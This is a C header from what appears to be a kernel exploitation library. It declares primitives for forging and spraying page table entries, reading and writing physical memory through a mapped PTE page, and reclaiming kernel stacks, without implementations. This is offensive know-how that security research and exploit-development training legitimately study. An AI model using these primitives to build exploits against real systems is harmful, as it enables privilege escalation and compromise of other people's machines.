#ifndef _KPWN_PAGE_PRIMITIVE_
#define _KPWN_PAGE_PRIMITIVE_

#include <kpwn/overwrite.h>
#include <stddef.h>
#include <stdint.h>

// Page-level exploitation primitives: PTE forge/spray, physical R/W,
// and kernel stack reclamation.

// --- PTE manipulation --------------------------------------------------------

#define KPWN_PTE_PRESENT (1ULL << 0)
#define KPWN_PTE_RW (1ULL << 1)
#define KPWN_PTE_USER (1ULL << 2)
#define KPWN_PTE_ACCESSED (1ULL << 5)
#define KPWN_PTE_DIRTY (1ULL << 6)
#define KPWN_PTE_NX (1ULL << 63)

#define KPWN_PTE_DEFAULT_FLAGS                                                 \
  (KPWN_PTE_PRESENT | KPWN_PTE_RW | KPWN_PTE_USER | KPWN_PTE_ACCESSED |        \
   KPWN_PTE_DIRTY | KPWN_PTE_NX)

uint64_t kpwn_pte_make(uint64_t paddr, uint64_t flags);
uint64_t kpwn_pte_get_pfn(uint64_t pte);
uint64_t kpwn_pte_get_phys(uint64_t pte);

// --- PTE spray ---------------------------------------------------------------

struct kpwn_pte_spray {
  void *base;
  size_t len;
  size_t stride;
  size_t touched_pages;
  size_t expected_pt_pages;
};

int kpwn_pte_spray_alloc(struct kpwn_pte_spray *s, size_t vma_bytes,
                         unsigned flags);
int kpwn_pte_spray_touch(struct kpwn_pte_spray *s);
int kpwn_pte_spray_free(struct kpwn_pte_spray *s);

#define KPWN_PTE_SPRAY_READONLY (1u << 0)

// --- Physical R/W via mapped PTE page ----------------------------------------

struct kpwn_physrw {
  void *mapped_pte_page;
  size_t page_size;
};

int kpwn_physrw_from_mapped_pte(struct kpwn_physrw *rw, void *mapped_pte_page,
                                size_t page_size);
int kpwn_physrw_read(struct kpwn_physrw *rw, uint64_t paddr, void *buf,
                     size_t len);
int kpwn_physrw_write(struct kpwn_physrw *rw, uint64_t paddr, const void *data,
                      size_t len);

// --- Kernel stack reclamation ------------------------------------------------

struct kpwn_kstack_reclaim {
  int *tids;
  size_t n_threads;
  volatile int stop;
};

int kpwn_kstack_reclaim_start(struct kpwn_kstack_reclaim *r, size_t n_threads);
int kpwn_kstack_reclaim_stop(struct kpwn_kstack_reclaim *r);

#endif
